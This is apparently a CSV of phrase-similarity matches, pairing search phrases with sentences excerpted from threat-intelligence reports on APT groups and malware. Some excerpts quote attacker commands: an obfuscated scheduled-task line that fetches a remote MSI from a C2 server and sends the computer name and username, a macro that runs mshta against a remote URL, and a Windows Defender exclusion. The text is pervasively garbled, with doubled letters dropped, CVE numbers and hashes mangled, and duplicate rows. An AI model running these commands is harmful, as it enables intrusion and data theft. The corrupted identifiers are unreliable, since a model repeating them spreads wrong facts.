hash,phrase,similarity,adjacent_sentences
08a0ccc49008dbbf532b22d39ac2b886,or delete files,0.9100446427209737,"['4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.']"
b5d067b705e3d7716dc5cd360e61cc7d,Scheduled task,0.7802401837560938,"['The MagicString clas provides a geter property, which decrypts strings on aces.', '2.', 'The MagicString clas has an encrypted string field.', '3.', 'The MagicString clas provides _Decrypt, a wraper method for decryption.', '4.', 'If it is StealthMutants first time to use the _Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) wil be initialized based on the hard-coded _factory value, although this IV is meaningles in Electronic Code Block (ECB) mode.']"
751a00c60e4d6cfbca29fd60f12530fc,Scheduled task,0.7899713560434016,"['Python 7/8 Tactic ID Name Description Comand and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.07 JavaScript watering-hole atack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T106 Native API files and inject proceses.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.05 Task start after instalation.', 'Persistence Bot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.01 Registry Run Keys / Startup Folder loader.', 'Proces Injection: Portable Defense T105.02 Dolphin can inject into other proceses.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled task,0.7601237586297603,"['On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled task,0.76857650111508,"['On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.']"
399c17d5f44d8b855c9751aae73f3c11,Scheduled task,0.7518470907202128,"['Then the atackers ran PowerShel and aded these files to the MS Windows Defender exclusions list.', '""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$user\\$apdata\\aPCyDwLsApDgb.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'After that, they used the standard tol named schtasks.exe to create scheduled tasks, and one of the files previously droped onto the computer served as the configuration file for these tasks.', '""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\aPCyDwLsApDgb"" /XML ""$user\\$temp\\tmp8ACB.tmp"" (MITRE: T1053.05 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 82 Example launch of malware in Kaspersky Sandbox: Figure 35 Ilustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 83 Example 3 Another similar example of a phishing email.', 'The email contains two atached archives: Figure 36 Phishing email When 25th April_PDF.exe is run, it uses PowerShel to change the configuration of Windows Defender: ""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$selfpath\\$selfname.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'Then it creates a task in the scheduler to achieve persistence: ""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\htOTEVF"" /XML ""$user\\$temp\\tmp56EA.']"
cae33c8970a53857dff6608fe8894b8a,Scheduled task,1.0,"['One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.']"
a9e5224d5686f541f8796eb25399c125,Scheduled task,0.7884814873277122,"['RESEARCH_ Docles Vietnam APT Inovacin y laboratorio April 2019 elevenpaths.com RESEARCH_ Docles Vietnam APT -A technique stil alive- Index What have we discovered?', '.', '3 Globaly Unique Identifier (GUID) .', '3 Docles DOC with thre stages .', '4 DOS OBFUSCATION .']"
0797d04ce55799cf7c3246d39567ce99,Scheduled task,0.8551867234600203,"['htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
0797d04ce55799cf7c3246d39567ce99,Scheduled task,0.8551867234600203,"['htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
cae33c8970a53857dff6608fe8894b8a,create a scheduled task,0.8433953123588676,"['One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.']"
88d674726f92a0b205d41f6b44c23d24,The computer name,0.9942504715728093,[]
88d674726f92a0b205d41f6b44c23d24,The computer name,0.9942504715728093,[]
475cc557a403e5a686bf4e9a5b16e3d2,The computer name,0.775710754431105,"['Having a botable at al times.', 'Often, I forget that boting live version alows me to repair or is the main purpose since I also use it restore the system.', 'I can also quickly to transfer large files.', 'The best-case instal the OS to any other computer.', 'scenario is that you wil never ned it.', 'Tails: This botable OS (tails.boum.', 'If you do, you wil be glad you made org) alows me to launch an entire these eforts.']"
0d1c0b15d71a2e81bf1d3fc93557761d,the computer name is sent to the C2,0.8178311130445094,"['CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.']"
0d1c0b15d71a2e81bf1d3fc93557761d,the username is also sent to the C2.,0.8456263203043786,"['CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.']"
0d1c0b15d71a2e81bf1d3fc93557761d,The computer name and the username is also sent to the C2.,1.0,"['CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.']"
75291a1b40c627ac33b55119a494eacd,file stealer,0.7819941275633288,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .']"
18fdef6f2cea9e0b1ab1a71f532e578a,file stealer,0.7819941275633288,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .']"
c7c9dc3d3f903b2ce98ced8a8e8576c2,file stealer,1.0,"['Since 2014, the group has ben operating a malware framework that we have named NightClub.', 'It uses the SMTP and IMAP (email) protocols for C&C comunications.', 'Starting in 2020, the group has ben using, in paralel, a second malware framework we have named Disco.', 'Both NightClub and Disco suport aditional spying plugins including a screnshoter, an audio recorder, and a file stealer.', 'Victimology Acording to ESET telemetry, the group targets foreign embasies in Belarus, and we have identified four diferent countries whose embasy staf have ben targeted: two from Europe, one from South Asia, and one from Africa.', 'The key dates are shown in Figure 1.', '1/20 Figure 1.']"
8be76b8e09117447731108cd5189e509,file stealer,1.0,"['List of plugin DL files Plugin DL name Overview Keyloger.', 'Kstrcs.dl It only actively logs keystrokes when the foreground window belongs to a proces named Q.exe and the window title matches QEdit.', ""It's likely target is the Tencent Q chat aplication."", 'File stealer.', 'Has a configuration file that enables the colection of files from diferent sources: HDs, sebasek.dl USB thumb drives, and CD-ROMs; as wel as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be betwen a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dl key.', 'pRsm.dl Captures input and output audio streams.']"
c0dca056b757e270a63caed5fb0f0fba,Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.,0.7872211662449353,"['Network segmentation can halt the propagation of ransomware through an organizations network.', 'This solution involves spliting the larger network into smaler network segments and can be acomplished through firewals, virtual local area networks, and other separation techniques.', 'If remote aces solutions are crucial to daily operations, al remote aces services and protocols, such as Citrix and RDP, should be implemented with two-factor or multi-factor authentication.', 'Exposed Remote Desktop Protocol (RDP) servers are also abused by threat actors to gain initial aces into a targets network.', 'Threat actors wil lok for networks that have internet-facing servers runing RDP and then exploit vulnerabilities in those servers or use brute-force pasword atacks.', 'Once inside the network, the threat actors move lateraly and instal ransomware on target machines, often disabling backups and other protections.', '7 CTA-202-0802 Recorded Future | w.recordedfuture.com CYBER THREAT ANALYSIS Outlok Infostealer malware and exfiltrated logs wil remain popular among threat actors as a means to obtain credentials to gain aces to victim networks.']"
009dda7551ff6a1a7bf199dfb068fea0,The threat actor also engaged in brute-forcing against the victim's internal web services,1.0,"['EclecticIQ analysts identified a modified version of Cobalt Strike known as ""Cobalt Strike Cat""[1].', ""Researchers analyzed these logs and created a detailed map of the adversary's tactics, techniques, and procedures (TPs)."", 'The threat actor primarily focused on exploiting four diferent remote code execution (RCE) vulnerabilities to target web services and heavily relied on open-source tols, some of which are exclusively available in Chinese underground forums.', ""The threat actor also engaged in brute-forcing against the victim's internal web services."", '1/19 Exposed Threat Actor Infrastructure Reveals Ofensive Toling EclecticIQ analysts discovered a web server with the IP adres 156[.]251[.]172[.', ']194, which was acesible to the public.', 'The server contained HTP header data (SimpleHTP/0.6 Python/3.8.10), indicating the use of a Python library caled SIMPLEHTPSERVER to serve the files and folders detailed in Figure 1.']"
009dda7551ff6a1a7bf199dfb068fea0,List of recently opened files and folders on the computer.,0.7539173212318052,"['* the curent directory and its subdirectories.', 'arp a Adres resolutions for remote systems.', 'netsh wlan show profiles Display a list of al the wireles network profiles.', 'dir List of recently opened files and folders on the %APDATA%\\Microsoft\\Windows\\Recent computer.', '9/19 Figure 1 shows some examples of comands executed by the threat actor on an infected host: Figure 1 Executed reconaisance comands on infected host.', 'Escalate Privileges with Stolen Credentials The threat actor uses stolen paswords from valid acounts as the primary vector for privilege escalation.', 'The actor deployed various credential stealing techniques against compromised hosts to obtain user acount paswords in NTLM hash format and saved credentials from web browser.']"
009dda7551ff6a1a7bf199dfb068fea0,the reverse SOCKS proxy activity on the infected device using the open-source tool FRP.,0.7916683264385116,"['Move Lateraly Trough Reverse Proxy The threat actor utilized open-source reverse proxy tols to expose local devices located behind a NAT or firewal, to the Internet.', 'This alowed the atacker to conduct vulnerability scans, general reconaisance, and brute-force atacks on systems atached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\Windows\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tol FRP.', 'FRP received a comand-line argument from atacker used to establish a conection from the adversary-controled infrastructure (156[.]251[.]172[.', ']194) over port 23.', '12/19 Figure 15 Execution of FRP reverse SOCKS proxy on infected host.']"
009dda7551ff6a1a7bf199dfb068fea0,Execution of FRP reverse SOCKS proxy on infected host.,0.8908700218505028,"['Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tol FRP.', 'FRP received a comand-line argument from atacker used to establish a conection from the adversary-controled infrastructure (156[.]251[.]172[.', ']194) over port 23.', '12/19 Figure 15 Execution of FRP reverse SOCKS proxy on infected host.', 'After establishing the reverse SOCKS proxy conection, the threat actor performed internal reconaisance and brute forcing atempts on some of the internal FTP servers inside victim network.', 'Victimology and Targeting Paterns EclecticIQ researchers ases with moderate confidence that the primary targets of the threat actor are Taiwanese government entities and organizations in the critical infrastructures sector.', 'Logs obtained from atacker infrastructure, such as target lists and metadata show that organizations in Taiwan acount for the largest proportion of targets.']"
009dda7551ff6a1a7bf199dfb068fea0,Threat actor uploaded the fast reverse proxy (FRP) binary,0.7713243506218127,"['Figure 14 Instalation of malicious Windows service.', 'Move Lateraly Trough Reverse Proxy The threat actor utilized open-source reverse proxy tols to expose local devices located behind a NAT or firewal, to the Internet.', 'This alowed the atacker to conduct vulnerability scans, general reconaisance, and brute-force atacks on systems atached to the internal network of the infected device.', 'Threat actor uploaded the fast reverse proxy (FRP) binary to the ""C:\\Windows\\Temp"" file path and then executed it on victim machine.', 'Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tol FRP.', 'FRP received a comand-line argument from atacker used to establish a conection from the adversary-controled infrastructure (156[.]251[.]172[.', ']194) over port 23.']"
009dda7551ff6a1a7bf199dfb068fea0,the threat actor primarily focuses on four different known remote code execution (RCE) vulnerabilities during their operations:•    CVE-2023-21839      Oracle WebLogic Server RCE [13]•    CVE-2021-3129      Laravel debug mode RCE [14]•    CVE-2020-2551      Oracle WebLogic RCE [15]•    CVE-2021-44228     Apache Log4j [16],0.8044485531978601,"['The adversary also demonstrated an interest in exploring the public-facing network surface of public transport and utilities industries.', 'Figure 4 Completed reconaisance and vulnerability scans.', '4/19 Initial Compromise Through Exploiting Publicly Facing Aplications The threat actor utilized automated vulnerability discovery and reconaisance techniques to scan a given target list, refine the selection and identify potential exploitable systems before comencing the atack.', 'Based on evidence obtained from the bash history data, EclecticIQ researchers observed that the threat actor primarily focuses on four diferent known remote code execution (RCE) vulnerabilities during their operations: CVE-2023-21839 Oracle WebLogic Server RCE [13] CVE-2021-3129 Laravel debug mode RCE [14] CVE-2020-251 Oracle WebLogic RCE [15] CVE-2021-428 Apache Log4j [16] Figure 5 BASH history logs of from the threat actors system showing exploitation of CVE-2020-251.', 'Establish Fothold by Modified Version of Cobalt Strike The threat actor utilized a modified version of Cobalt Strike 4.5, dubed ""Cobalt Strike Cat"", to create a dedicated comunication chanel from the victim system and perform evasive post-exploitation steps.', 'Cobalt Strike Cat was initialy shared on a Chinese-speaking cybersecurity forum caled t0ls[.', ']com, with a link to a GitHub repository and was distributed inside an encrypted ZIP folder.']"
009dda7551ff6a1a7bf199dfb068fea0,the victim IP address was publicly serving a web service that contained a phpMyAdmin database.,0.8065225108936074,"['The result of the ""tasklist"" comand shows that the victim was using a comercial software caled SONAS [18].', 'SONAS is an aplication for remote monitoring and control of Internet of Things (IoT) hardware devices.', 'Analysts ases with high confidence that the compromised device was used to aces CTV cameras of the Directorate General of Highways in Taiwan.', 'Analysis showed that the victim IP adres was publicly serving a web service that contained a phpMyAdmin database.', 'The database used a weak pasword and was susceptible to brute-force atacks.', 'Figure 9 shows the redacted victim DNS adres, confirming that the web service was used by the Taiwanese government.', 'The IP adreses and the computer name matched the victim device name in the Cobalt Strike Cat logs.']"
7c835116563bd415741d640fd6a04033,the actor introduced a downloader to fetch and spawn the next stage payload,0.8771472748806102,"['After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload.', 'The actor tok advantage of several scripts, including Visual Basic Script and Windows Batch script.', 'They also started using disk image file formats, .iso and .vhd, to deliver their malware.', 'For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.', 'Although the initial intrusion methods were very diferent in this campaign, the final payload that we had analyzed previously was used without significant changes.', 'Novel infection chain Long-lasting initial infection Based on our telemetry, we observed that one victim in the UAE was atacked using a malicious Word document.', 'The victim received a document file named Shamjit Client Details Form.doc on September 2, 202.']"
0cb31182c70e3c1900fee9f19cd10fb8,"a file downloaded from the internet,",0.7725744527111534,"['In order to suced, the intended victim must chose either to save this file and atack pigybacking on SolarWinds, leading to the compromise of major subsequently open it, or to open it directly.', 'If either is chosen, a smal piece of JavaScript decodes the organizations including many parts of the US government.', 'ISO file, which is embeded directly in the HTML atachment.', 'It is not downloaded from the internet.', 'The Dukes: Phishing European diplomats In the previous threat report, ESET researchers highlighted several spearphishing campaigns against European diplomats.', 'These malicious operations were atributed to an infamous cyberespionage group known as the Dukes.', 'In October and November 2021, ESET detected aditional spearphishing campaigns, again targeting European diplomatic misions and Ministries of Foreign Afairs.']"
e15fbf8bdb3a2ebc68fdf55143a7f9b8,fetch the next stage payload.,0.7729420661921118,"['The macro has a simple functionality and, interestingly, it spawns several child Windows comand shels, probably intended for evading behavior-based analysis.', 'Eventualy, the macro executes a fetched payload with the mshta.exe proces that is designed to execute a Microsoft HTML Aplication.', 'The folowing scriptlet is part of a malicious macro in the document.', 'It contains a remote server adres to fetch the next stage payload.', 'cmd = ""c"" + ""md /"" + ""c c"" + ""md /"" + ""c cm"" + ""d /"" + ""c c"" + ""m"" + ""d /"" + ""c c"" + ""md /"" + ""c c"" + 1 ""md /"" + ""c msht"" + ""a.e"" + ""xe hxp:/lehr24.mywebcomunity[.', ']org/h.php"" 2 Shel cmd, 0 3 Slep 90 4 cmd = ""cm"" + ""d /"" + ""c TAS"" + ""KI"" + ""L /"" + ""F /"" + ""IM msh"" + ""ta.e"" + ""xe"" 5 Shel cmd, 0 Luckily, we discovered the coresponding C2 script (h.php) from our telemetry.', 'This script saves incoming trafic information to the log.txt file including the date, IP adres, user-agent and the right-most 20 characters of the IP MD5 hash which is internaly caled TID (probably short for Target ID).']"
920bbf3f4cf30cf9c556531074485448,cmd.exe /c,0.8176210416244082,"['29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .']"
31347d89b18461f35448b26fefb00133,cmd.exe /c,1.0,"['USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.']"
